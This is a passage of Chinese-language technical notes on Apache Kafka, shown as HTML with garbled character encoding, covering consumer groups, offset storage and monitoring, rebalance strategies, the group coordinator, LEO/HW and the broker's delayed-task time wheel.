groupAï¼šconsumer1:æ¶ˆè´¹ partition0 consuemr2:æ¶ˆè´¹ partition1 consuemr3:æ¶ˆè´¹ä¸åˆ°æ•°æ® groupB: consuemr3:æ¶ˆè´¹åˆ°partition0å’Œpartition1 3ï¼‰å¦‚æœconsumer groupä¸­æŸä¸ªæ¶ˆè´¹è€…æŒ‚äº†ï¼Œæ­¤æ—¶ä¼šè‡ªåŠ¨æŠŠåˆ†é…ç»™ä»–çš„åˆ†åŒºäº¤ç»™å…¶ä»–çš„æ¶ˆè´¹è€…ï¼Œå¦‚æœä»–åˆé‡å¯äº†ï¼Œé‚£ä¹ˆåˆä¼šæŠŠä¸€äº›åˆ†åŒºé‡æ–°äº¤è¿˜ç»™ä»–</p>
<h2 id="Kafkaæ¶ˆè´¹è€…"><a href="#Kafkaæ¶ˆè´¹è€…" class="headerlink" title="Kafkaæ¶ˆè´¹è€…"></a>Kafkaæ¶ˆè´¹è€…</h2><h3 id="æ¶ˆè´¹ç»„æ¦‚å¿µ"><a href="#æ¶ˆè´¹ç»„æ¦‚å¿µ" class="headerlink" title="æ¶ˆè´¹ç»„æ¦‚å¿µ"></a>æ¶ˆè´¹ç»„æ¦‚å¿µ</h3><p>groupidç›¸åŒå°±å±äºåŒä¸€ä¸ªæ¶ˆè´¹ç»„ </p>
<p>1ï¼‰æ¯ä¸ªconsumeréƒ½è¦å±äºä¸€ä¸ªconsumer.groupï¼Œå°±æ˜¯ä¸€ä¸ªæ¶ˆè´¹ç»„ï¼Œtopicçš„ä¸€ä¸ªåˆ†åŒºåªä¼šåˆ†é…ç»™ä¸€ä¸ªæ¶ˆè´¹ç»„ä¸‹çš„ä¸€ä¸ªconsumeræ¥å¤„ç†ï¼Œæ¯ä¸ªconsumerå¯èƒ½ä¼šåˆ†é…å¤šä¸ªåˆ†åŒºï¼Œä¹Ÿæœ‰å¯èƒ½æŸä¸ªconsumeræ²¡æœ‰åˆ†é…åˆ°ä»»ä½•åˆ†åŒº </p>
<p>2ï¼‰å¦‚æœæƒ³è¦å®ç°ä¸€ä¸ªå¹¿æ’­çš„æ•ˆæœï¼Œé‚£åªéœ€è¦ä½¿ç”¨ä¸åŒçš„group idå»æ¶ˆè´¹å°±å¯ä»¥ã€‚topicA: partition0ã€partition1 groupAï¼šconsumer1:æ¶ˆè´¹ partition0 consuemr2:æ¶ˆè´¹ partition1 consuemr3:æ¶ˆè´¹ä¸åˆ°æ•°æ® groupB: consuemr3:æ¶ˆè´¹åˆ°partition0å’Œpartition1 3ï¼‰å¦‚æœconsumer groupä¸­æŸä¸ªæ¶ˆè´¹è€…æŒ‚äº†ï¼Œæ­¤æ—¶ä¼šè‡ªåŠ¨æŠŠåˆ†é…ç»™ä»–çš„åˆ†åŒºäº¤ç»™å…¶ä»–çš„æ¶ˆè´¹è€…ï¼Œå¦‚æœä»–åˆé‡å¯äº†ï¼Œé‚£ä¹ˆåˆä¼šæŠŠä¸€äº›åˆ†åŒºé‡æ–°äº¤è¿˜ç»™ä»–</p>
<h3 id="åŸºç¡€æ¡ˆä¾‹æ¼”ç¤º"><a href="#åŸºç¡€æ¡ˆä¾‹æ¼”ç¤º" class="headerlink" title="åŸºç¡€æ¡ˆä¾‹æ¼”ç¤º"></a>åŸºç¡€æ¡ˆä¾‹æ¼”ç¤º</h3><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/aed77e9fab134609aed020088015f63a~tplv-k3u1fbpfcp-watermark.awebp" alt="å›¾ç‰‡"></p>
<h3 id="åç§»é‡ç®¡ç†"><a href="#åç§»é‡ç®¡ç†" class="headerlink" title="åç§»é‡ç®¡ç†"></a>åç§»é‡ç®¡ç†</h3><ol>
<li>æ¯ä¸ªconsumerå†…å­˜é‡Œæ•°æ®ç»“æ„ä¿å­˜å¯¹æ¯ä¸ªtopicçš„æ¯ä¸ªåˆ†åŒºçš„æ¶ˆè´¹offsetï¼Œå®šæœŸä¼šæäº¤offsetï¼Œè€ç‰ˆæœ¬æ˜¯å†™å…¥zkï¼Œä½†æ˜¯é‚£æ ·é«˜å¹¶å‘è¯·æ±‚zkæ˜¯ä¸åˆç†çš„æ¶æ„è®¾è®¡ï¼Œzkæ˜¯åšåˆ†å¸ƒå¼ç³»ç»Ÿçš„åè°ƒçš„ï¼Œè½»é‡çº§çš„å…ƒæ•°æ®å­˜å‚¨ï¼Œä¸èƒ½è´Ÿè´£é«˜å¹¶å‘è¯»å†™ï¼Œä½œä¸ºæ•°æ®å­˜å‚¨ã€‚</li>
<li>ç°åœ¨æ–°çš„ç‰ˆæœ¬æäº¤offsetå‘é€ç»™kafkaå†…éƒ¨topicï¼š__consumer_offsetsï¼Œæäº¤è¿‡å»çš„æ—¶å€™ï¼Œ keyæ˜¯group.id+topic+åˆ†åŒºå·ï¼Œvalueå°±æ˜¯å½“å‰offsetçš„å€¼ï¼Œæ¯éš”ä¸€æ®µæ—¶é—´ï¼Œkafkaå†…éƒ¨ä¼šå¯¹è¿™ä¸ªtopicè¿›è¡Œcompact(åˆå¹¶)ï¼Œä¹Ÿå°±æ˜¯æ¯ä¸ªgroup.id+topic+åˆ†åŒºå·å°±ä¿ç•™æœ€æ–°æ•°æ®ã€‚</li>
<li>__consumer_offsetså¯èƒ½ä¼šæ¥æ”¶é«˜å¹¶å‘çš„è¯·æ±‚ï¼Œæ‰€ä»¥é»˜è®¤åˆ†åŒº50ä¸ª(leader partitiron -&gt; 50 kafka)ï¼Œè¿™æ ·å¦‚æœä½ çš„kafkaéƒ¨ç½²äº†ä¸€ä¸ªå¤§çš„é›†ç¾¤ï¼Œæ¯”å¦‚æœ‰50å°æœºå™¨ï¼Œå°±å¯ä»¥ç”¨50å°æœºå™¨æ¥æŠ—offsetæäº¤çš„è¯·æ±‚å‹åŠ›. æ¶ˆè´¹è€… -&gt; brokerç«¯çš„æ•°æ® message -&gt; ç£ç›˜ -&gt; offset é¡ºåºé€’å¢ ä»å“ªå„¿å¼€å§‹æ¶ˆè´¹ï¼Ÿ-&gt; offset æ¶ˆè´¹è€…ï¼ˆoffsetï¼‰</li>
</ol>
<h3 id="åç§»é‡ç›‘æ§å·¥å…·ä»‹ç»"><a href="#åç§»é‡ç›‘æ§å·¥å…·ä»‹ç»" class="headerlink" title="åç§»é‡ç›‘æ§å·¥å…·ä»‹ç»"></a>åç§»é‡ç›‘æ§å·¥å…·ä»‹ç»</h3><ol>
<li>webé¡µé¢ç®¡ç†çš„ä¸€ä¸ªç®¡ç†è½¯ä»¶(kafka Manager) ä¿®æ”¹bin&#x2F;kafka-run-class.shè„šæœ¬ï¼Œç¬¬ä¸€è¡Œå¢åŠ JMX_PORT&#x3D;9988 <strong>é‡å¯kafkaè¿›ç¨‹</strong></li>
<li>å¦ä¸€ä¸ªè½¯ä»¶ï¼šä¸»è¦ç›‘æ§çš„consumerçš„åç§»é‡ã€‚å°±æ˜¯ä¸€ä¸ªjaråŒ… java -cp KafkaOffsetMonitor-assembly-0.3.0-SNAPSHOT.jar com.quantifind.kafka.offsetapp.OffsetGetterWeb â€“offsetStorage kafka \ï¼ˆæ ¹æ®ç‰ˆæœ¬ï¼šåç§»é‡å­˜åœ¨kafkaå°±å¡«kafkaï¼Œå­˜åœ¨zookeeperå°±å¡«zookeeperï¼‰ â€“zk hadoop1:2181 â€“port 9004 â€“refresh 15.seconds â€“retain 2.daysã€‚</li>
</ol>
<h3 id="æ¶ˆè´¹å¼‚å¸¸æ„ŸçŸ¥"><a href="#æ¶ˆè´¹å¼‚å¸¸æ„ŸçŸ¥" class="headerlink" title="æ¶ˆè´¹å¼‚å¸¸æ„ŸçŸ¥"></a>æ¶ˆè´¹å¼‚å¸¸æ„ŸçŸ¥</h3><p>heartbeat.interval.msï¼šconsumerå¿ƒè·³æ—¶é—´é—´éš”ï¼Œå¿…é¡»å¾—ä¸coordinatorä¿æŒå¿ƒè·³æ‰èƒ½çŸ¥é“consumeræ˜¯å¦æ•…éšœäº†ï¼Œ ç„¶åå¦‚æœæ•…éšœä¹‹åï¼Œå°±ä¼šé€šè¿‡å¿ƒè·³ä¸‹å‘rebalanceçš„æŒ‡ä»¤ç»™å…¶ä»–çš„consumeré€šçŸ¥ä»–ä»¬è¿›è¡Œrebalanceçš„æ“ä½œ session.timeout.msï¼škafkaå¤šé•¿æ—¶é—´æ„ŸçŸ¥ä¸åˆ°ä¸€ä¸ªconsumerå°±è®¤ä¸ºä»–æ•…éšœäº†ï¼Œé»˜è®¤æ˜¯10ç§’ max.poll.interval.msï¼šå¦‚æœåœ¨ä¸¤æ¬¡pollæ“ä½œä¹‹é—´ï¼Œè¶…è¿‡äº†è¿™ä¸ªæ—¶é—´ï¼Œé‚£ä¹ˆå°±ä¼šè®¤ä¸ºè¿™ä¸ªconsumeå¤„ç†èƒ½åŠ›å¤ªå¼±äº†ï¼Œä¼šè¢«è¸¢å‡ºæ¶ˆè´¹ç»„ï¼Œåˆ†åŒºåˆ†é…ç»™åˆ«äººå»æ¶ˆè´¹ï¼Œä¸€èˆ¬æ¥è¯´ç»“åˆä¸šåŠ¡å¤„ç†çš„æ€§èƒ½æ¥è®¾ç½®å°±å¯ä»¥äº†ã€‚</p>
<h3 id="æ ¸å¿ƒå‚æ•°è§£é‡Š"><a href="#æ ¸å¿ƒå‚æ•°è§£é‡Š" class="headerlink" title="æ ¸å¿ƒå‚æ•°è§£é‡Š"></a>æ ¸å¿ƒå‚æ•°è§£é‡Š</h3><p>fetch.max.bytesï¼šè·å–ä¸€æ¡æ¶ˆæ¯æœ€å¤§çš„å­—èŠ‚æ•°ï¼Œä¸€èˆ¬å»ºè®®è®¾ç½®å¤§ä¸€äº›ï¼Œé»˜è®¤æ˜¯1M å…¶å®æˆ‘ä»¬åœ¨ä¹‹å‰å¤šä¸ªåœ°æ–¹éƒ½è§åˆ°è¿‡è¿™ä¸ªç±»ä¼¼çš„å‚æ•°ï¼Œæ„æ€å°±æ˜¯è¯´ä¸€æ¡ä¿¡æ¯æœ€å¤§èƒ½å¤šå¤§ï¼Ÿ</p>
<ol>
<li>Producer å‘é€çš„æ•°æ®ï¼Œä¸€æ¡æ¶ˆæ¯æœ€å¤§å¤šå¤§ï¼Œ -&gt; 10M</li>
<li>Broker å­˜å‚¨æ•°æ®ï¼Œä¸€æ¡æ¶ˆæ¯æœ€å¤§èƒ½æ¥å—å¤šå¤§ -&gt; 10M</li>
<li>Consumer max.poll.records: ä¸€æ¬¡pollè¿”å›æ¶ˆæ¯çš„æœ€å¤§æ¡æ•°ï¼Œé»˜è®¤æ˜¯500æ¡ connection.max.idle.msï¼šconsumerè·Ÿbrokerçš„socketè¿æ¥å¦‚æœç©ºé—²è¶…è¿‡äº†ä¸€å®šçš„æ—¶é—´ï¼Œæ­¤æ—¶å°±ä¼šè‡ªåŠ¨å›æ”¶è¿æ¥ï¼Œä½†æ˜¯ä¸‹æ¬¡æ¶ˆè´¹å°±è¦é‡æ–°å»ºç«‹socketè¿æ¥ï¼Œè¿™ä¸ªå»ºè®®è®¾ç½®ä¸º-1ï¼Œä¸è¦å»å›æ”¶ enable.auto.commit: å¼€å¯è‡ªåŠ¨æäº¤åç§»é‡ auto.commit.interval.ms: æ¯éš”å¤šä¹…æäº¤ä¸€æ¬¡åç§»é‡ï¼Œé»˜è®¤å€¼5000æ¯«ç§’ _consumer_offset auto.offset.resetï¼šearliest å½“å„åˆ†åŒºä¸‹æœ‰å·²æäº¤çš„offsetæ—¶ï¼Œä»æäº¤çš„offsetå¼€å§‹æ¶ˆè´¹ï¼›æ— æäº¤çš„offsetæ—¶ï¼Œä»å¤´å¼€å§‹æ¶ˆè´¹ topica -&gt; partition0:1000 partitino1:2000 latest å½“å„åˆ†åŒºä¸‹æœ‰å·²æäº¤çš„offsetæ—¶ï¼Œä»æäº¤çš„offsetå¼€å§‹æ¶ˆè´¹ï¼›æ— æäº¤çš„offsetæ—¶ï¼Œæ¶ˆè´¹æ–°äº§ç”Ÿçš„è¯¥åˆ†åŒºä¸‹çš„æ•°æ® none topicå„åˆ†åŒºéƒ½å­˜åœ¨å·²æäº¤çš„offsetæ—¶ï¼Œä»offsetåå¼€å§‹æ¶ˆè´¹ï¼›åªè¦æœ‰ä¸€ä¸ªåˆ†åŒºä¸å­˜åœ¨å·²æäº¤çš„offsetï¼Œåˆ™æŠ›å‡ºå¼‚å¸¸</li>
</ol>
<h3 id="ç»¼åˆæ¡ˆä¾‹æ¼”ç¤º-1"><a href="#ç»¼åˆæ¡ˆä¾‹æ¼”ç¤º-1" class="headerlink" title="ç»¼åˆæ¡ˆä¾‹æ¼”ç¤º"></a>ç»¼åˆæ¡ˆä¾‹æ¼”ç¤º</h3><p>å¼•å…¥æ¡ˆä¾‹ï¼šäºŒæ‰‹ç”µå•†å¹³å°ï¼ˆæ¬¢ä¹é€ï¼‰ï¼Œæ ¹æ®ç”¨æˆ·æ¶ˆè´¹çš„é‡‘é¢ï¼Œå¯¹ç”¨æˆ·æ˜Ÿæ˜Ÿè¿›è¡Œç´¯è®¡ã€‚è®¢å•ç³»ç»Ÿï¼ˆç”Ÿäº§è€…ï¼‰ -&gt; Kafkaé›†ç¾¤é‡Œé¢å‘é€äº†æ¶ˆæ¯ã€‚ä¼šå‘˜ç³»ç»Ÿï¼ˆæ¶ˆè´¹è€…ï¼‰ -&gt; Kafaké›†ç¾¤é‡Œé¢æ¶ˆè´¹æ¶ˆæ¯ï¼Œå¯¹æ¶ˆæ¯è¿›è¡Œå¤„ç†ã€‚</p>
<h3 id="group-coordinatoråŸç†"><a href="#group-coordinatoråŸç†" class="headerlink" title="group coordinatoråŸç†"></a>group coordinatoråŸç†</h3><p>é¢è¯•é¢˜ï¼šæ¶ˆè´¹è€…æ˜¯å¦‚ä½•å®ç°rebalanceçš„ï¼Ÿâ€” æ ¹æ®coordinatorå®ç°</p>
<ol>
<li>ä»€ä¹ˆæ˜¯coordinator æ¯ä¸ªconsumer groupéƒ½ä¼šé€‰æ‹©ä¸€ä¸ªbrokerä½œä¸ºè‡ªå·±çš„coordinatorï¼Œä»–æ˜¯è´Ÿè´£ç›‘æ§è¿™ä¸ªæ¶ˆè´¹ç»„é‡Œçš„å„ä¸ªæ¶ˆè´¹è€…çš„å¿ƒè·³ï¼Œä»¥åŠåˆ¤æ–­æ˜¯å¦å®•æœºï¼Œç„¶åå¼€å¯rebalanceçš„</li>
<li>å¦‚ä½•é€‰æ‹©coordinatoræœºå™¨ é¦–å…ˆå¯¹groupIdè¿›è¡Œhashï¼ˆæ•°å­—ï¼‰ï¼Œæ¥ç€å¯¹__consumer_offsetsçš„åˆ†åŒºæ•°é‡å–æ¨¡ï¼Œé»˜è®¤æ˜¯50ï¼Œ_consumer_offsetsçš„åˆ†åŒºæ•°å¯ä»¥é€šè¿‡offsets.topic.num.partitionsæ¥è®¾ç½®ï¼Œæ‰¾åˆ°åˆ†åŒºä»¥åï¼Œè¿™ä¸ªåˆ†åŒºæ‰€åœ¨çš„brokeræœºå™¨å°±æ˜¯coordinatoræœºå™¨ã€‚æ¯”å¦‚è¯´ï¼šgroupIdï¼Œâ€œmyconsumer_groupâ€ -&gt; hashå€¼ï¼ˆæ•°å­—ï¼‰-&gt; å¯¹50å–æ¨¡ -&gt; 8 __consumer_offsets è¿™ä¸ªä¸»é¢˜çš„8å·åˆ†åŒºåœ¨å“ªå°brokerä¸Šé¢ï¼Œé‚£ä¸€å°å°±æ˜¯coordinator å°±çŸ¥é“è¿™ä¸ªconsumer groupä¸‹çš„æ‰€æœ‰çš„æ¶ˆè´¹è€…æäº¤offsetçš„æ—¶å€™æ˜¯å¾€å“ªä¸ªåˆ†åŒºå»æäº¤offsetï¼Œ</li>
<li>è¿è¡Œæµç¨‹ 1ï¼‰æ¯ä¸ªconsumeréƒ½å‘é€JoinGroupè¯·æ±‚åˆ°Coordinatorï¼Œ 2ï¼‰ç„¶åCoordinatorä»ä¸€ä¸ªconsumer groupä¸­é€‰æ‹©ä¸€ä¸ªconsumerä½œä¸ºleaderï¼Œ 3ï¼‰æŠŠconsumer groupæƒ…å†µå‘é€ç»™è¿™ä¸ªleaderï¼Œ 4ï¼‰æ¥ç€è¿™ä¸ªleaderä¼šè´Ÿè´£åˆ¶å®šæ¶ˆè´¹æ–¹æ¡ˆï¼Œ 5ï¼‰é€šè¿‡SyncGroupå‘ç»™Coordinator 6ï¼‰æ¥ç€Coordinatorå°±æŠŠæ¶ˆè´¹æ–¹æ¡ˆä¸‹å‘ç»™å„ä¸ªconsumerï¼Œä»–ä»¬ä¼šä»æŒ‡å®šçš„åˆ†åŒºçš„ leader brokerå¼€å§‹è¿›è¡Œsocketè¿æ¥ä»¥åŠæ¶ˆè´¹æ¶ˆæ¯</li>
</ol>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c9e984d9f2504c86a1323192e84f4a75~tplv-k3u1fbpfcp-watermark.awebp" alt="å›¾ç‰‡"></p>
<h3 id="rebalanceç­–ç•¥"><a href="#rebalanceç­–ç•¥" class="headerlink" title="rebalanceç­–ç•¥"></a>rebalanceç­–ç•¥</h3><p>consumer groupé coordinatorå®ç°äº†Rebalance</p>
<p>è¿™é‡Œæœ‰ä¸‰ç§rebalanceçš„ç­–ç•¥ï¼šrangeã€round-robinã€sticky</p>
<p>æ¯”å¦‚æˆ‘ä»¬æ¶ˆè´¹çš„ä¸€ä¸ªä¸»é¢˜æœ‰12ä¸ªåˆ†åŒºï¼šp0,p1,p2,p3,p4,p5,p6,p7,p8,p9,p10,p11 å‡è®¾æˆ‘ä»¬çš„æ¶ˆè´¹è€…ç»„é‡Œé¢æœ‰ä¸‰ä¸ªæ¶ˆè´¹è€…</p>
<ol>
<li>rangeç­–ç•¥ rangeç­–ç•¥å°±æ˜¯æŒ‰ç…§partitonçš„åºå·èŒƒå›´ p0~3 consumer1 p4<del>7 consumer2 p8</del>11 consumer3 é»˜è®¤å°±æ˜¯è¿™ä¸ªç­–ç•¥ï¼›</li>
<li>round-robinç­–ç•¥ å°±æ˜¯è½®è¯¢åˆ†é… consumer1:0,3,6,9 consumer2:1,4,7,10 consumer3:2,5,8,11 ä½†æ˜¯å‰é¢çš„è¿™ä¸¤ä¸ªæ–¹æ¡ˆæœ‰ä¸ªé—®é¢˜ï¼š12 -&gt; 2 æ¯ä¸ªæ¶ˆè´¹è€…ä¼šæ¶ˆè´¹6ä¸ªåˆ†åŒº</li>
</ol>
<p>å‡è®¾consuemr1æŒ‚äº†:p0-5åˆ†é…ç»™consumer2,p6-11åˆ†é…ç»™consumer3 è¿™æ ·çš„è¯ï¼ŒåŸæœ¬åœ¨consumer2ä¸Šçš„çš„p6,p7åˆ†åŒºå°±è¢«åˆ†é…åˆ°äº† consumer3ä¸Šã€‚</p>
<ol>
<li>stickyç­–ç•¥ æœ€æ–°çš„ä¸€ä¸ªstickyç­–ç•¥ï¼Œå°±æ˜¯è¯´å°½å¯èƒ½ä¿è¯åœ¨rebalanceçš„æ—¶å€™ï¼Œè®©åŸæœ¬å±äºè¿™ä¸ªconsumer çš„åˆ†åŒºè¿˜æ˜¯å±äºä»–ä»¬ï¼Œç„¶åæŠŠå¤šä½™çš„åˆ†åŒºå†å‡åŒ€åˆ†é…è¿‡å»ï¼Œè¿™æ ·å°½å¯èƒ½ç»´æŒåŸæ¥çš„åˆ†åŒºåˆ†é…çš„ç­–ç•¥</li>
</ol>
<p>consumer1ï¼š0-3 consumer2: 4-7 consumer3: 8-11 å‡è®¾consumer3æŒ‚äº† consumer1ï¼š0-3ï¼Œ+8,9 consumer2: 4-7ï¼Œ+10,11</p>
<h2 id="Brokerç®¡ç†"><a href="#Brokerç®¡ç†" class="headerlink" title="Brokerç®¡ç†"></a>Brokerç®¡ç†</h2><p>15.1 Leoã€hwå«ä¹‰</p>
<ol>
<li>Kafkaçš„æ ¸å¿ƒåŸç†</li>
<li>å¦‚ä½•å»è¯„ä¼°ä¸€ä¸ªé›†ç¾¤èµ„æº</li>
<li>æ­å»ºäº†ä¸€å¥—kafkaé›†ç¾¤ -ã€‹ ä»‹ç»äº†ç®€å•çš„ä¸€äº›è¿ç»´ç®¡ç†çš„æ“ä½œã€‚</li>
<li>ç”Ÿäº§è€…ï¼ˆä½¿ç”¨ï¼Œæ ¸å¿ƒçš„å‚æ•°ï¼‰</li>
<li>æ¶ˆè´¹è€…ï¼ˆåŸç†ï¼Œä½¿ç”¨çš„ï¼Œæ ¸å¿ƒå‚æ•°ï¼‰</li>
<li>brokerå†…éƒ¨çš„ä¸€äº›åŸç†</li>
</ol>
<p>æ ¸å¿ƒçš„æ¦‚å¿µï¼šLEOï¼ŒHW LEOï¼šæ˜¯è·Ÿoffsetåç§»é‡æœ‰å…³ç³»ã€‚</p>
<p>LEOï¼šåœ¨kafkaé‡Œé¢ï¼Œæ— è®ºleader partitionè¿˜æ˜¯follower partitionç»Ÿä¸€éƒ½ç§°ä½œå‰¯æœ¬ï¼ˆreplicaï¼‰ã€‚</p>
<blockquote>
<p>æ¯æ¬¡partitionæ¥æ”¶åˆ°ä¸€æ¡æ¶ˆæ¯ï¼Œéƒ½ä¼šæ›´æ–°è‡ªå·±çš„LEOï¼Œä¹Ÿå°±æ˜¯log end offsetï¼ŒLEOå…¶å®å°±æ˜¯æœ€æ–°çš„offset + 1</p>
</blockquote>
<p>HWï¼šé«˜æ°´ä½ LEOæœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„åŠŸèƒ½å°±æ˜¯æ›´æ–°HWï¼Œå¦‚æœfollowerå’Œleaderçš„LEOåŒæ­¥äº†ï¼Œæ­¤æ—¶HWå°±å¯ä»¥æ›´æ–° HWä¹‹å‰çš„æ•°æ®å¯¹æ¶ˆè´¹è€…æ˜¯å¯è§ï¼Œæ¶ˆæ¯å±äºcommitçŠ¶æ€ã€‚HWä¹‹åçš„æ¶ˆæ¯æ¶ˆè´¹è€…æ¶ˆè´¹ä¸åˆ°ã€‚</p>
<h3 id="Leoæ›´æ–°"><a href="#Leoæ›´æ–°" class="headerlink" title="Leoæ›´æ–°"></a>Leoæ›´æ–°</h3><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/396815ebdb1b4c6e84c327b89a41dedb~tplv-k3u1fbpfcp-watermark.awebp" alt="å›¾ç‰‡"></p>
<h3 id="hwæ›´æ–°"><a href="#hwæ›´æ–°" class="headerlink" title="hwæ›´æ–°"></a>hwæ›´æ–°</h3><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/414c9b515d6c4aca8358dc2ea8b04f04~tplv-k3u1fbpfcp-watermark.awebp" alt="å›¾ç‰‡"></p>
<h3 id="controllerå¦‚ä½•ç®¡ç†æ•´ä¸ªé›†ç¾¤"><a href="#controllerå¦‚ä½•ç®¡ç†æ•´ä¸ªé›†ç¾¤" class="headerlink" title="controllerå¦‚ä½•ç®¡ç†æ•´ä¸ªé›†ç¾¤"></a>controllerå¦‚ä½•ç®¡ç†æ•´ä¸ªé›†ç¾¤</h3><p>1: ç«äº‰controllerçš„ &#x2F;controller&#x2F;id 2ï¼šcontrolleræœåŠ¡ç›‘å¬çš„ç›®å½•ï¼š&#x2F;broker&#x2F;ids&#x2F; ç”¨æ¥æ„ŸçŸ¥ brokerä¸Šä¸‹çº¿ &#x2F;broker&#x2F;topics&#x2F; åˆ›å»ºä¸»é¢˜ï¼Œæˆ‘ä»¬å½“æ—¶åˆ›å»ºä¸»é¢˜å‘½ä»¤ï¼Œæä¾›çš„å‚æ•°ï¼ŒZKåœ°å€ã€‚&#x2F;admin&#x2F;reassign_partitions åˆ†åŒºé‡åˆ†é… â€¦â€¦<a href="https://link.juejin.cn/?target=http://mp.weixin.qq.com/s?__biz=MzIxMTE0ODU5NQ==&mid=2650245169&idx=2&sn=54ffaab18e546e714519880a141627c0&chksm=8f5ae26db82d6b7bf2b51ea15938ce8623f4593cf228e801c0920b1dda4a01b29da0b1956118&scene=21%23wechat_redirect"><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ebb809ac0a0f417e9438b33890959b85~tplv-k3u1fbpfcp-watermark.awebp" alt="å›¾ç‰‡"></a></p>
<h3 id="å»¶æ—¶ä»»åŠ¡"><a href="#å»¶æ—¶ä»»åŠ¡" class="headerlink" title="å»¶æ—¶ä»»åŠ¡"></a>å»¶æ—¶ä»»åŠ¡</h3><p>kafkaçš„å»¶è¿Ÿè°ƒåº¦æœºåˆ¶ï¼ˆæ‰©å±•çŸ¥è¯†ï¼‰ æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹kafkaé‡Œé¢å“ªäº›åœ°æ–¹éœ€è¦æœ‰ä»»åŠ¡è¦è¿›è¡Œå»¶è¿Ÿè°ƒåº¦ã€‚ç¬¬ä¸€ç±»å»¶æ—¶çš„ä»»åŠ¡ï¼šæ¯”å¦‚è¯´producerçš„acks&#x3D;-1ï¼Œå¿…é¡»ç­‰å¾…leaderå’Œfolloweréƒ½å†™å®Œæ‰èƒ½è¿”å›å“åº”ã€‚æœ‰ä¸€ä¸ªè¶…æ—¶æ—¶é—´ï¼Œé»˜è®¤æ˜¯30ç§’ï¼ˆrequest.timeout.msï¼‰ã€‚æ‰€ä»¥éœ€è¦åœ¨å†™å…¥ä¸€æ¡æ•°æ®åˆ°leaderç£ç›˜ä¹‹åï¼Œå°±å¿…é¡»æœ‰ä¸€ä¸ªå»¶æ—¶ä»»åŠ¡ï¼Œåˆ°æœŸæ—¶é—´æ˜¯30ç§’å»¶æ—¶ä»»åŠ¡ æ”¾åˆ°DelayedOperationPurgatoryï¼ˆå»¶æ—¶ç®¡ç†å™¨ï¼‰ä¸­ã€‚å‡å¦‚åœ¨30ç§’ä¹‹å‰å¦‚æœæ‰€æœ‰followeréƒ½å†™å…¥å‰¯æœ¬åˆ°æœ¬åœ°ç£ç›˜äº†ï¼Œé‚£ä¹ˆè¿™ä¸ªä»»åŠ¡å°±ä¼šè¢«è‡ªåŠ¨è§¦å‘è‹é†’ï¼Œå°±å¯ä»¥è¿”å›å“åº”ç»“æœç»™å®¢æˆ·ç«¯äº†ï¼Œ å¦åˆ™çš„è¯ï¼Œè¿™ä¸ªå»¶æ—¶ä»»åŠ¡è‡ªå·±æŒ‡å®šäº†æœ€å¤šæ˜¯30ç§’åˆ°æœŸï¼Œå¦‚æœåˆ°äº†è¶…æ—¶æ—¶é—´éƒ½æ²¡ç­‰åˆ°ï¼Œå°±ç›´æ¥è¶…æ—¶è¿”å›å¼‚å¸¸ã€‚ç¬¬äºŒç±»å»¶æ—¶çš„ä»»åŠ¡ï¼šfollowerå¾€leaderæ‹‰å–æ¶ˆæ¯çš„æ—¶å€™ï¼Œå¦‚æœå‘ç°æ˜¯ç©ºçš„ï¼Œæ­¤æ—¶ä¼šåˆ›å»ºä¸€ä¸ªå»¶æ—¶æ‹‰å–ä»»åŠ¡ å»¶æ—¶æ—¶é—´åˆ°äº†ä¹‹åï¼ˆæ¯”å¦‚åˆ°äº†100msï¼‰ï¼Œå°±ç»™followerè¿”å›ä¸€ä¸ªç©ºçš„æ•°æ®ï¼Œç„¶åfollowerå†æ¬¡å‘é€è¯·æ±‚è¯»å–æ¶ˆæ¯ï¼Œ ä½†æ˜¯å¦‚æœå»¶æ—¶çš„è¿‡ç¨‹ä¸­(è¿˜æ²¡åˆ°100ms)ï¼Œleaderå†™å…¥äº†æ¶ˆæ¯ï¼Œè¿™ä¸ªä»»åŠ¡å°±ä¼šè‡ªåŠ¨è‹é†’ï¼Œè‡ªåŠ¨æ‰§è¡Œæ‹‰å–ä»»åŠ¡ã€‚</p>
<p>æµ·é‡çš„å»¶æ—¶ä»»åŠ¡ï¼Œéœ€è¦å»è°ƒåº¦ã€‚</p>
<h3 id="æ—¶é—´è½®æœºåˆ¶"><a href="#æ—¶é—´è½®æœºåˆ¶" class="headerlink" title="æ—¶é—´è½®æœºåˆ¶"></a>æ—¶é—´è½®æœºåˆ¶</h3><ol>
<li>ä»€ä¹ˆä¼šæœ‰è¦è®¾è®¡æ—¶é—´è½®ï¼ŸKafkaå†…éƒ¨æœ‰å¾ˆå¤šå»¶æ—¶ä»»åŠ¡ï¼Œæ²¡æœ‰åŸºäºJDK Timeræ¥å®ç°ï¼Œé‚£ä¸ªæ’å…¥å’Œåˆ é™¤ä»»åŠ¡çš„æ—¶é—´å¤æ‚åº¦æ˜¯O(nlogn)ï¼Œ è€Œæ˜¯åŸºäºäº†è‡ªå·±å†™çš„æ—¶é—´è½®æ¥å®ç°çš„ï¼Œæ—¶é—´å¤æ‚åº¦æ˜¯O(1)ï¼Œä¾é æ—¶é—´è½®æœºåˆ¶ï¼Œå»¶æ—¶ä»»åŠ¡æ’å…¥å’Œåˆ é™¤ï¼ŒO(1)</li>
